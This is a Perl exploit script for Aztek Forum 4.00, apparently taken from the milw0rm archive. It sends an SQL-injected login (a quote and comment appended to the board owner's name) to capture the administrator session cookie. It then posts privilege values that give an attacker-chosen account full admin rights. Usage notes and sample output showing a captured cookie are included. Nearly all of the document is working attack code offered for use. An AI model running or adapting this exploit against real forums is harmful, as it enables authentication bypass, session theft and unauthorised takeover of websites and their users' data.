#!/usr/bin/perl
use IO::Socket;
# Aztek Forum 4.00 Change User Rights Remote Exploit
#
# only if the magic_quote are : OFF <<<<<<<<<<<<<<<<<<<<<<
#
# Hum hum , sorry for my bad english i'm french ;)
# Note : Before using this exploit you must create a count on the board :) 
# And this count will receive the administrator
# rights !
# aztek_gar.pl <host> <path> <board_owner> <user>
# aztek_gar.pl 127.0.0.1 /aztek/ Admin Attacker
#
#
#+------------------------------------------------------------+
#- Aztek 4.0 Give Admin rights to a normal user   -
#-                                                                           
#     -
#-                         coded by _Sparah_                      -
#+-----------------------------------------------------------+
#
# [~] Connection to 127.0.0.1 on port 80 ...
#
# [+] CoOkie : ATK_ADMIN=6688f12bf61a432c22e38c46a194e6ea
#
# [!] D0ne !

# var
$host = $ARGV[0];
$path = $ARGV[1];
$owner = $ARGV[2];
$user = $ARGV[3];

#banner
if (@ARGV<4) {
print q(

+--------+
| banner |
+---------------------------------------------+
|Aztek 4.0 Give Admin Rights to a normal user |
|                                             |
|                              by _Sparah_    |
+---------------------------------------------+
                    -=[X]=-
+---------------------------------------------+
| http://www.eos-team.be/                     |
| http://sparah.next-touch.com/ (soon)        |
+---------------------------------------------+
                    -=[X]=-
+---------------------------------------------+
| Usage :                                     |
|                                             |
| *.pl <host> <path> <board_owner> <user>     |
| ex : 127.0.0.1 /aztek/ Admin Attacker       |
|                                             |
+---------------------------------------------+
                                       | E.o.S|
                                       +------+

);exit();}

print "

+----------------------------------------------+
- Aztek 4.0 Give Admin rights to a normal user -
-                                              -
-                         coded by _Sparah_    -
+----------------------------------------------+

";

print "\n[~] Connection to $host on port 80 ...\n";

#1st request
$req1= "login=".$owner."%27%23&passwd=";
$len1= length $req1;

$send = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$host", PeerPort 
=> "80") || die "\n[-] Connection failed...";
print $send "POST ".$path."myadmin.php?action=login HTTP/1.1\n";
print $send "Host: $host\n";
print $send "Cookie: ATK_PASSWD=; ATK_LOGIN=nobody; ATK_SESS=\n";
print $send "Content-Type: application/x-www-form-urlencoded\n";
print $send "Content-Length: ".$len1."\n\n";
print $send "".$req1."\n";

# take cookie value
while(chomp($cookie=<$send>))
{
    if ($cookie =~ /Set\-Cookie\: (\S+)/)
    {
        $ATK=$1;
        close($send);
    }
}

print "\n[+] CoOkie : ".$ATK."\n";

# 2nd request
$req2 = 
"login=".$user."&priv%5B%5D=0&priv%5B%5D=1&priv%5B%5D=4&priv%5B%5D=2&priv%5B%5D=3&priv%5B%5D=5";
$len2 = length $req2;
$data = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$host", PeerPort 
=> "80") || die "\n[-] Connection failed...";
print $data "POST ".$path."myadmin.php?action=admin&choix=6 HTTP/1.1\n";
print $data "Host: ".$host."\n";
print $data "Cookie: ".$ATK."\n";
print $data "Content-Type: application/x-www-form-urlencoded\n";
print $data "Content-Length: ".$len2."\n\n";
print $data "".$req2."\n";
read $data,$res,9000;
print $res;
print "\n[!] D0ne !\n\n";

# milw0rm.com [2006-03-26]